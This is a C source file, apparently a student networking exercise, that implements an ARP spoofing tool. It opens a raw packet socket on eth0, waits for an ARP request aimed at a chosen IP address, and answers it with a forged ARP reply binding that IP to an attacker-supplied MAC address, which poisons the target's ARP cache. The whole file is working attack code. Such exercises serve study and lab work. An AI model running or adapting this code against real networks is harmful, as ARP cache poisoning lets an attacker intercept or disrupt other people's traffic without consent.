#define _POSIX_C_SOURCE 200112L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <netpacket/packet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>

#ifndef NI_MAXHOST
#define NI_MAXHOST 1025 // Maximum length of a hostname 
#endif

#ifndef NI_NUMERICHOST
#define NI_NUMERICHOST 1
#endif
struct ethernet_header {
    uint8_t dest[6];   // MAC destination
    uint8_t src[6];    // MAC source
    uint16_t ethertype; // arp = 0x0806, ipv4 = 0x0800
} __attribute__((packed));

struct arp_header {
    uint16_t htype;     // Ethernet = 1
    uint16_t ptype;     // IPv4 = 0x0800
    uint8_t  hlen;      // 6
    uint8_t  plen;      // 4
    uint16_t oper;      // request = 1 reponse egl 2 
    uint8_t  sha[6];    // MAC source
    uint8_t  spa[4];    // IP source
    uint8_t  tha[6];    // MAC cible
    uint8_t  tpa[4];    // IP cible
} __attribute__((packed));

struct interphase {
    char *name;
    char *ip;
    char *mac;
};

struct packet {
    struct ethernet_header eth;
    struct arp_header arp;
} __attribute__((packed));

typedef struct malcolm {
    struct arp_header arp;
    struct ethernet_header eth;
    struct interphase reseau;
    
    char *dest;
    char *src;
    char *dest_mac;
    char *src_mac;

} Malcolm;

Malcolm malcolm;


/*
    *@brief: easy if c it's between 0 and 9 c - '0' and if c is between a and f c - 'a' + 10
    *@param: c: char to convert
    *@return: int value of the char c 
*/

static int hex_value(char c)
{
    if (c >= '0' && c <= '9')
        return (c - '0');
    if (c >= 'a' && c <= 'f')
        return (c - 'a' + 10);
    if (c >= 'A' && c <= 'F')
        return (c - 'A' + 10);
    return (-1);
}

/*
* @brief: get network interface information, eth0 interess me 
* @param: reseau: struct interphase to fill with network interface information
* @return: 0 on success, 1 on error
*/

int getInterfaceReseau(struct interphase *reseau)
{
    struct ifaddrs *ifaddr, *ifa;
    char ip[NI_MAXHOST];

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return 1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;

        int family = ifa->ifa_addr->sa_family;

        if (family == AF_INET) {
            // IPv4 address
            getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
                        ip, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
            if(strcmp(ifa->ifa_name, "eth0") == 0) {
                reseau->name = strdup(ifa->ifa_name);
                reseau->ip = strdup(ip);
            }
            //printf("Interface: %s\tAddress: %s\n", ifa->ifa_name, ip);
        }
        if (ifa->ifa_addr->sa_family == AF_PACKET)
        {
            struct sockaddr_ll *s =
                (struct sockaddr_ll *)ifa->ifa_addr;
            if(strcmp(ifa->ifa_name, "eth0") == 0) {
                char mac[18];
                snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                         s->sll_addr[0], s->sll_addr[1], s->sll_addr[2],
                         s->sll_addr[3], s->sll_addr[4], s->sll_addr[5]);
                reseau->mac = strdup(mac);
            }
            /*printf("Interface: %s\tMAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
                   ifa->ifa_name,
                   s->sll_addr[0],
                   s->sll_addr[1],
                   s->sll_addr[2],
                   s->sll_addr[3],
                   s->sll_addr[4],
                   s->sll_addr[5]);*/
        }

    }

    freeifaddrs(ifaddr);
    return 0;
}
/*
* @brief: check mac address format convention is XX:XX:...
*/
int check_addr_mac(const char *mac, uint8_t hardwareAddr[6])
{
    int hi; // high nibble
    int lo; // low nibble
    int i;

    for (i = 0; i < 6; i++)
    {
        hi = hex_value(mac[i * 3]); // first number XX: 
        lo = hex_value(mac[i * 3 + 1]); // second number XX:
        if (hi == -1 || lo == -1)
            return (0);
        hardwareAddr[i] = (hi << 4) | lo; // you shift hi to left, then add lo
        if (i != 5 && mac[i * 3 + 2] != ':')
            return (0);
    }
    return (mac[17] == '\0');
}

int is_valid_ip(const char *ip)
{
    struct in_addr addr;

    return inet_pton(AF_INET, ip, &addr) == 1; // histoire de savoir si c'est valide
}

int checkDEC(char *ip)
{
    for (int i = 0; ip[i] != '\0'; i++)
    {
        if (ip[i] == '.')
            return (0);
    }
    return (1);
}

int resolve_ip(const char *host, uint8_t out[4])
{
    struct addrinfo hints;
    struct addrinfo *res;
    struct sockaddr_in *ipv4;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;

    if (getaddrinfo(host, NULL, &hints, &res) != 0)
        return 0;

    ipv4 = (struct sockaddr_in *)res->ai_addr;
    memcpy(out, &ipv4->sin_addr, 4);

    freeaddrinfo(res);
    return 1;
}

int main(int argc, char *argv[])
{
    int v = 0;
    if (argc < 5 || argc > 6) {
        fprintf(stderr, "Usage: no valid arg <dest> <src> <dest_mac> <src_mac>\n");
        return 1;
    }

    malcolm.dest = argv[3];
    malcolm.src = argv[1];
    
    malcolm.dest_mac = argv[4];
    malcolm.src_mac = argv[2];

    /*printf("Destination: %s\n", malcolm.dest);
    printf("Source: %s\n", malcolm.src);
    printf("Destination MAC: %s\n", malcolm.dest_mac);
    printf("Source MAC: %s\n", malcolm.src_mac);*/

    if (!inet_pton(AF_INET, malcolm.src, &malcolm.arp.spa)) {
        fprintf(stderr, "Invalid IP address provided :%s\n", malcolm.src);
        return 1;
    }
    if (!inet_pton(AF_INET, malcolm.dest, &malcolm.arp.tpa)) {
        fprintf(stderr, "Invalid IP address provided :%s\n", malcolm.dest);
        return 1;
    }
    if (!check_addr_mac(malcolm.dest_mac, malcolm.arp.tha) || 
            !check_addr_mac(malcolm.src_mac, malcolm.arp.sha)) {
        fprintf(stderr, "Invalid MAC address provided %s\n", malcolm.dest_mac);
        return 1;
    }
    //memcpy(malcolm.arp.spa, inet_pton(AF_INET, malcolm.src, &malcolm.arp.spa), 4);
    // memcpy(malcolm.arp.tpa, inet_pton(AF_INET, malcolm.dest, &malcolm.arp.tpa), 4);
    // conf arp header

    malcolm.arp.htype = htons(1);
    malcolm.arp.ptype = htons(0x0800);
    malcolm.arp.hlen = 6;
    malcolm.arp.plen = 4; 
    malcolm.arp.oper = htons(2);
    if (v)
        printf("configuring arp header \n");
    getInterfaceReseau(&malcolm.reseau);

    printf("Found available interface: %s\tAddress: %s\tMAC: %s\n", malcolm.reseau.name, malcolm.reseau.ip, malcolm.reseau.mac);

    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    // config header ethernet
    if (sockfd == -1)
    {
        perror("socket");
        return 1;
    }
    memcpy(malcolm.eth.dest, malcolm.arp.tha, 6);
    memcpy(malcolm.eth.src, malcolm.arp.sha, 6);
    malcolm.eth.ethertype = htons(ETH_P_ARP);

    // conf address for recv
    char buffer[1500];
    struct sockaddr_ll addr;
    socklen_t addr_len = sizeof(addr);
    memset(&addr, 0, sizeof(addr));

    addr.sll_family   = AF_PACKET;
    addr.sll_ifindex  = if_nametoindex(malcolm.reseau.name);
    addr.sll_protocol = htons(ETH_P_ARP);
    addr.sll_halen    = ETH_ALEN;

    memcpy(addr.sll_addr, malcolm.arp.tha, 6);


    struct ethernet_header *eth = (struct ethernet_header *) buffer;
    struct arp_header *arp = (struct arp_header *)
            (buffer + sizeof(struct ethernet_header));


    while(1) {
        ssize_t len = recvfrom(sockfd, buffer, sizeof(buffer), 0,
            (struct sockaddr *)&addr, &addr_len);
        if (len < (ssize_t)(sizeof(struct ethernet_header) +
             sizeof(struct arp_header))) {
            continue; 
        }

        eth = (struct ethernet_header *) buffer;
        arp = (struct arp_header *)
            (buffer + sizeof(struct ethernet_header));
        
         // 1. vérifier ARP
        if (ntohs(eth->ethertype) != 0x0806)
            continue;
        // 2. vérifier request
        if (ntohs(arp->oper) != 1)
            continue;

        // 3. vérifier cible = IP que tu spoofes
        if (memcmp(arp->tpa, malcolm.arp.spa, 4) != 0)
            continue;
        break;
    }
    printf("An ARP request has been broadcast.\n");
    printf("MAC address of request: %02x:%02x:%02x:%02x:%02x:%02x\n",
       arp->sha[0], arp->sha[1], arp->sha[2],
       arp->sha[3], arp->sha[4], arp->sha[5]);
    char ip[INET_ADDRSTRLEN];

    inet_ntop(AF_INET, arp->spa, ip, sizeof(ip));
    printf("IP address of request: %s\n", ip);
    struct packet pkt;
    memset(&pkt, 0, sizeof(pkt));
    memcpy(pkt.eth.dest, arp->sha, 6);
    memcpy(pkt.eth.src, malcolm.arp.sha, 6);
    pkt.eth.ethertype = htons(0x0806);
    if (v)
        printf("packet config\n");

    pkt.arp = malcolm.arp;
    pkt.arp.oper = htons(2);

    printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");

    struct sockaddr_ll send_addr;
    memset(&send_addr, 0, sizeof(send_addr));
    memcpy(send_addr.sll_addr, arp->sha, 6);
    
    send_addr.sll_family   = AF_PACKET;
    send_addr.sll_protocol = htons(ETH_P_ARP);
    send_addr.sll_ifindex  = if_nametoindex(malcolm.reseau.name);
    send_addr.sll_halen    = ETH_ALEN;
    sendto(sockfd,
       &pkt,
       sizeof(pkt),
       0,
       (struct sockaddr *)&send_addr,
       sizeof(send_addr));
    printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
    if (v)
        printf("free ressources");
    printf("Exiting program...\n");
    free(malcolm.reseau.name);
    free(malcolm.reseau.ip);
    free(malcolm.reseau.mac);
    return 0;
}

